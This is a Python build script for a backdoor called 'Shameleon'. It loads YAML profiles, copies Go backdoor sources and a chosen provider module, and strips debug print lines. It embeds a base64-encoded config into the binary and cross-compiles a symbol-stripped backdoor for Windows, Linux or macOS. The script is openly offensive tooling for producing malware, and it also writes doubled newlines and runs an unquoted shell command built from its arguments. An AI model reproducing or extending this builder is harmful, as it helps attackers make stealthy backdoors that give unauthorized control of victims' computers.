#!/bin/env python3
import argparse
import os
import shutil
from base64 import b64encode
from tempfile import TemporaryDirectory

from shameleon_client.profile import Profile


def copy_file(src, dst, debug=False):
    if debug:
        shutil.copy(src, dst)
        return
    with open(src, encoding='utf-8') as in_f:
        with open(dst, 'w', encoding='utf-8') as out_f:
            for line in in_f:
                stripped_line = line.strip()
                if stripped_line.startswith('println') and stripped_line != 'println("error", errorcode)':
                    continue
                else:
                    out_f.write(line + '\n')


def main() -> None:
    # ARGS PARSING
    parser = argparse.ArgumentParser("Shameleon builder - v0.2")
    parser.add_argument(
        '-p',
        '--profile-dir',
        default='./profiles',
        help="Path to directory containing profiles",
    )
    parser.add_argument(
        '-d',
        '--debug',
        action='store_true',
        help="Enable debug mode on backdoor",
    )
    parser.add_argument(
        '-o',
        '--output-dir',
        default='./',
        help="Path to directory where backdoor will be built",
    )
    parser.add_argument(
        'profile',
        type=str,
        help='Names of backdoor to use',
    )
    parser.add_argument(
        'os',
        type=str,
        choices=['windows', 'linux', 'darwin'],
        help='OS to build for',
    )
    args = parser.parse_args()

    # Load profiles
    profiles: dict[str, Profile] = {}
    for file_name in os.listdir(args.profile_dir):
        ext = file_name.split('.')[-1].lower()
        if ext not in ['yaml', 'yml']:
            continue
        profile_path = os.path.join(args.profile_dir, file_name)
        profile = Profile.load(profile_path)
        profiles[profile.name] = profile
    print(f'[*] {len(profiles)} profiles loaded.')
    chosen_profile = profiles.get(args.profile)
    if chosen_profile is None:
        print(f'[!] Profile {args.profile} not found.')
        exit(1)
    print(f"[*] Using profile {chosen_profile.name}")
    print(f"[*] Building for {args.os}")

    with TemporaryDirectory() as tmp_dir:
        # Copy files to target directory
        print(f"[*] Copying files to {tmp_dir}")
        provider_filename = f"provider_{chosen_profile.provider_name}.go"
        for file_name in os.listdir('./backdoor_src'):
            if file_name.startswith('provider_') and file_name != provider_filename:
                continue
            print(f'[.] Copying {file_name} to {tmp_dir} [debug={args.debug}]')
            copy_file(
                os.path.join('./backdoor_src', file_name),
                os.path.join(tmp_dir, file_name),
                args.debug,
            )
        for file_name in os.listdir('./backdoor_providers'):
            if file_name != provider_filename:
                continue
            print(f'[.] Copying {file_name} to {tmp_dir} [debug={args.debug}]')
            copy_file(
                os.path.join('./backdoor_providers', file_name),
                os.path.join(tmp_dir, file_name),
                args.debug,
            )

        # Build config
        print("[*] Building config")
        config = chosen_profile.serialize_for_backdoor()
        encoded_config = b64encode(config.encode('utf-8')).decode('utf-8')

        # Build backdoor
        print("[*] Building backdoor")
        flags = f'-ldflags="-s -w -X main.rawConfig={encoded_config}"'
        cmd = f'cd {tmp_dir} && GOOS={args.os} go build {flags} -o backdoor'
        print('[.] ' + cmd)
        os.system(cmd)
        # Copy backdoor to output directory
        print(f"[*] Copying backdoor to {args.output_dir}")
        shutil.copy(os.path.join(tmp_dir, 'backdoor'), args.output_dir)


if __name__ == '__main__':
    main()
